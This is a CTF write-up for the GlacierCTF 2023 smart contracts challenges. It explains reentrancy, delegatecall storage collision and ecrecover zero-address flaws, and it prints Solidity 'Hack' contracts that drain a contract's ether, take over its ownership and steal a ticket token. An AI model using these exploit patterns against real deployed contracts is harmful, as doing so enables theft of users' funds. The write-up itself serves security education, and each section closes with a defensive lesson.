## GlacierCTF 2023 Writeups - Smart Contracts Category
<center>
    <img src="./GlacierCTF.png" width="100%"/>
</center>
<br />

[GlcierCTF](https://glacierctf.com/) - SmartContracts category solutions ⛳️

I have participated in the GlacierCTF2k23 with the team **th3_Shell7evens** and we have managed to solve all the category challenges. This repository contains challenges writeups
## Useful commands
```shell
forge compile ## Compile smart contracts
forge test ## Run tests for challenges solution
forge test -vvv ## Run tests for challenges with tracers enabled
```
### Challenges 

- [GlacierCoin](#01---glaciercoin)
- [GlacierVault](#02---glaciervault)
- [ChairLift](#03---chairlift)
- [Council Of Apes](#04---council-of-apes)


## 01 - GlacierCoin

**Vulnerability presented in the challenge**: Reentrancy <br>

#### Attack workflow
By inspecting the `isSolved` method, we need to steal all the target's balance:
```solidity
function isSolved() public view returns (bool) {
    return address(TARGET).balance == 0;
}
```
The `GlacierCoin` is a simplified Token contract. We need to steal the contract's balance, so we need to search for a method that transfers ether externally. After a quick inspect, the function we are interested in is `sell`
```solidity
function sell(uint256 amount) public
{
    require(balances[msg.sender] >= amount, "You can not sell this much as you are poor af");
    uint256 new_balance = balances[msg.sender] - amount;
    (msg.sender).call{value: amount}("");
    balances[msg.sender] = new_balance;
}
```
If we notice, the contract attempts to send ether to the seller first, **then it updates the `balances` state by decreasing the seller's balance**. We know that when a contract receives ether, its `receive()` fallback is invoked. So, we can create a contract that when it receives ether, in other words: *when its `receive()` fallback is invoked*, it calls back the `GlacierCoin` contract to sell more tokens. That is possible because:
1. `GlacierCoin` contract is updating the seller's balance only after sending ether to it.
2. Smart contracts execution is sequential (the fallback executions will be executed before the state update).

Of course, we initialize the attack by buying 1 ether equivalent of tokens.
> If you are not familiar with the `Reentrancy` attack, I've explained it in details [here](https://github.com/Brivan-26/smart-contract-security/tree/master/Reentrancy)

#### Attack summary
1. Create a contract and initialize it with the Target contract.
2. Call `buy` method and send 1 ether along.
3. Call `sell(1 ether)` method.
4. When the `GlacierCoin` attempts to send ether to the `Hack` contract, the `receive()` fallback will call again the `sell` method (this process will repeat as long as `ClacierCoin`'s balance is greater than zero). 

#### Hack Contract
```solidity
contract Hack {
    GlacierCoin target;
    constructor(GlacierCoin _target) {
        target = _target;
    }

    function hack() external payable {
        require(msg.value == 1 ether, "Provide 1 ether to start the exploit");
        target.buy{value: msg.value}();
        target.sell(msg.value);
    }

     receive() external payable {
        if (address(target).balance > 0) {
            target.sell(msg.value);
        }
    }

}
```
**What to take from this challenge**: Respect `Checks Effects Interactions` pattern. Update the internal state before making external calls, or apply mutual execution to functions that make external calls (can be implemented using OpenZeppelin's [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) contract).

[Hack Contract](./src/GlacierCoin/GlacierCoin.sol) | [Solve test](./test/GlacierCoinTest.sol) | [Solve script](./scripts/GlacierCoin.sh)

## 02 - GlacierVault
To solve this challenge, we need to update the state of `asleep` to be true.
```solidity
function isSolved() public view returns (bool) {
    return TARGET.asleep();
}
```
**Vulnerability presented in the challenge**: Dangerous use of `delegatecall`<br>
#### Attack workflow
We need to update the `asleep` to true stored in the `Guardian` contract. There are two functions that do so, `punch` (which is not applicable as it requires 10M ether which we don't have) and `putToSleep`:
```solidity
function putToSleep() external {
    emit putToSleepCall(msg.sender, owner);
    require(msg.sender == owner, "You can't do that. The yeti mauls you.");
    asleep = true;
}
```
We notice that we must be the owner to make the call. So, the whole challenge is about stealing the ownership of `Guardian` contract. There's no way to update the `owner` state on the contract. However, the contract includes `fallback()` method which we know that it will be executed if we attempt to call a function that does not exist. The `fallback()` invokes the `_delegate` function which includes some interesting assembly code:
```solidity
function _delegate(address implementation) internal {
    assembly {
        // Copy msg.data. We take full control of memory in this inline assembly
        // block because it will not return to Solidity code. We overwrite the
        // Solidity scratch pad at memory position 0.
        calldatacopy(0, 0, calldatasize())

        // Call the implementation.
        // out and outsize are 0 because we don't know the size yet.
        let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

        // Copy the returned data.
        returndatacopy(0, 0, returndatasize())

        switch result
        // delegatecall returns 0 on error.
        case 0 {
        revert(0, returndatasize())
        }
        default {
            return(0, returndatasize())
        }
    }
}
```
We're not going to explain each instruction as the code already has some useful comments. We're interested in this line:
```solidity
let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
```
We're making a `delegatecall` to the `implementation` contract which got initialized to `GlacierVault` in the constructor. From the previous two instructions, we can see that whatever `msg.data` contains, it will be delegated to the implementation. One thing you MUST keep in mind when working with `delegatecall`: **it preserves the context**. Meaning that the `delegated contract`(`GlacierVault`) will execute in the context of `Guardian`. So, in the `GlacierVault`: 
1. writing to storage will affect the `Guardian` storage, not its storage.
2. The values of `msg.value`, `msg.sender` will be in the context of `Guardian`.
The first point is interesting (*writing to storage will affect the `Guardian` storage, not its storage*).
> If you don't know how smart contract stores its variable, or you are not familiar with the term `slot`, I invite you to read [this article](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)
The `owner` state is stored in `slot 2`. So, if the `Guardian` contract delegates the call to `GlacierVault` and the last writes to `slot2`, the `owner` state will be updated!<br>
After inspecting the `GlacierVault`, `quickStore` will write to `storage 2` whatever value we specify as argument if the `index` argument is 0 (because in such situation, the `quickstore1` will be updated, and it is stored in `slot 2`):
```solidity
function quickStore(uint8 index, uint256 value) public payable {
    require(msg.value == 1337);
    if(index == 0) {
        quickstore1 = value;
    }
    ...
}
```
    That's it! Let's make a recap of the attack flow:
1. Deploy a `Hack` contract and initialize it with the target
2. Calculate the function signature of `quickStore1` passing `0`, `uint256(uint160(msg.sender))` as arguments. (The cast of the address to `uint256` is needed because the function expects uint256 as second argument)
3. Call the `Guardian` contract with the `msg.data` calculated and send`1337 wei` along.
4. The `Guardian` contract delegates the execution to `GlacierVault` via `delegatecall`
5. The `GlacierVault` updates the `quickstore1`, so the `slot2` will contain the value we sent, but this happens in the context of `Guardian`, so `slot2` of `Guardian` is the one that gets updated. We've got the owner
6. Call the `putToSleep` method on `Guardian`
##### Hack Contract
```solidity
contract Hack {
    Guardian target;

    constructor(Guardian _target){
        target = _target;
    }

    function hack() external payable {
        require(msg.value == 1337, "You need to provide 1337 wei to start the exploit");
        bytes memory sig = abi.encodeWithSignature("quickStore(uint8,uint256)",0,uint256(uint160(address(this))));
        (bool success, ) = address(target).call{value: 1337}(sig);
        require(success);

        target.putToSleep();
    }
}
```
**What to take from this challenge**: Always remember when working with `delegatecall`, **it preserves the context**
[Hack contract](./src/GlacierVault/Guardian.sol) | [Solve test](./test/GlacierVaultTest.sol) | [Solve script](./scripts/GlacierVault.sh)

## 03 - ChairLift
> Personal pov: This is the most challenge I liked, its idea is nice (because I'm fun of ECC cryptography :V)
**Vulnerability presented in the challenge**: dangerous use of `ecrecover`<br>

The Target contract starts with 1 trip taken. We need to take another trip to solve the challenge:
```solidity
function isSolved() public view returns (bool) {
    return TARGET.tripsTaken() == 2;
}
```
To take a ride, we need to have a ticket
```solidity
function takeRide(uint256 ticketId) external {
    require (ticket.ownerOf(ticketId) == msg.sender, "You don't own this ticket");

    tripsTaken += 1;
    ticket.burn(ticketId);
}
```
So, the whole challenge is about to get at least one ticket. If we want to play honestly and go with the classical approach, we would call the `buyTicket` function on `ChairLift` contract, but we must either be an owner or pay 1M ether. We need to find another way :).<br>
There's nothing interesting in `ChainLift`, so the exploit must be in `Ticket` contract, the one that manages the tickets as tokens. The contract looks like ERC20 token with slight modifications and implements `EIP712`
> The understanding of [EIP712](https://eips.ethereum.org/EIPS/eip-712) is not necessary to solve the challenge, but having knowledge about it will help you to get into the security issue quickly.
After spending some time reading the contract and testing possible attack approaches, two functions were suspicious too much. First is `_tranfser`:
```solidity
function _transfer(address from, address to, uint256 tokenId) internal {
    require(ownerOf(tokenId) == from, "Ticket: transfer of token that is not own");
    require(to != address(0), "Ticket: transfer to the zero address");

    _owners[tokenId] = to;

    emit Transfer(from, to, tokenId);
}
```
The internal function `_transfer` doesn't make a check that `from != address(0)` which **might** be okay, because how can possibly the address zero be the sender? However, remains sus. The second function is `transferWithPermit`:
```solidity
function transferWithPermit(address from, address to, uint256 tokenId, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public {
    require(block.timestamp <= deadline, "Ticket: permit expired");
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", _getDomainSeparator(), keccak256(abi.encode(PERMIT_TYPEHASH, from, to, tokenId, nonces[from]++, deadline))));
    address signer = ecrecover(digest, v, r, s);
    require(signer == from, "Ticket: invalid permit");
    _transfer(from, to, tokenId);
}
```
The function contributes to the implementation of `EIP712`, it provides a way to transfer tokens from one account to another by manually signing a signature by using `ecrecover` which is an inbuilt cryptographic method that enables the retrieval of the signer's address of a message that has been signed using their private key. The `ecrcover` takes 4 parameters:
- `bytes32` - The hash of the signed message.
- `uint8` - The `v` value of the signature, where `v` the value represents the recovery identifier.
- `bytes32`` - The `r` value of the signature.
- `bytes32` - The `s` value of the signature.

> Not familiar with digital signatures? r, s, v seems confusing? Highly suggest reading [this](https://github.com/ethereumbook/ethereumbook/blob/develop/06transactions.asciidoc#digital-signatures)
After some research, I found that in case of an invalid signature, it does not revert or return a false boolean, but **it returns the address zero**. <br>
So, if we call the function passing `from` as `address(0)` and whatever other information, this check `require(signer == from, "Ticket: invalid permit");` will pass and the `_transfer` function will be called passing the following arguments: `_transfer(address(zero), to, tokenId)`. Do you remember? The `_transfer` doesn't check that `from != address(0)`. 
#### Attack workflow
1. Call the  `transferWithPermit` passing `address(0)` as `from` argument, `our address` as `to` argument, and `1` as `tokenId`: `transferWithPermit(address(0), OUR_ADDRESS,1,block.timestamp,3,bytes32(uint(3233)), bytes32(uint(555)))`
2. The `transferWithPermit` will call the internal function `_transfer` passing the following arguments: `_transfer(address(0), OUR_ADDRESS, 1)`
3. The check of ` require(ownerOf(tokenId) == from, "Ticket: transfer of token that is not own")` will pass because no one owns the tokenId 1
4. The token gets assigned to us via the following instruction: `_owners[tokenId] = to`. We got the ticket!
After that, we call `takeRide` passing the tokenId we stole.
#### Hack contract
```solidity
contract Hack {
    ChairLift target;
    constructor(ChairLift _target) {
        target = _target;
    }

    function hack() external {
        Ticket tr = target.ticket();
        tr.transferWithPermit(address(0), address(this),1,block.timestamp,3,bytes32(uint(3233)), bytes32(uint(555)));
        target.takeRide(1);
    }
}
```
**What to take from the challenge**: `ecrecover` returns address(0) if the signature is invalid. Always check the values of `from` and `to`
[Hack Contract](./src/ChairLift/ChairLift.sol) | [Solve test](./test/ChairLiftTest.t.sol) | [Solve script](./scripts/ChairLift.sh)

## 04 - Council Of Apes
**Vulnerability presented in the challenge**: **Flash Loan** attack<br>

> To solve the challenge, we need to understand the codebase and build a logical flow of transactions. Getting familiar with **Flash Loan Attacks** will help solving the challenge quickly. The attack workflow can be understood on the [Hack](./src/CouncilOfApes/IcyExchange.sol) contract directly.
[Hack contract](./src/CouncilOfApes//IcyExchange.sol) | [Solve test](./test/CouncilOfApesTest.t.sol) | [Solve script](./scripts/CouncilOfApes.sh)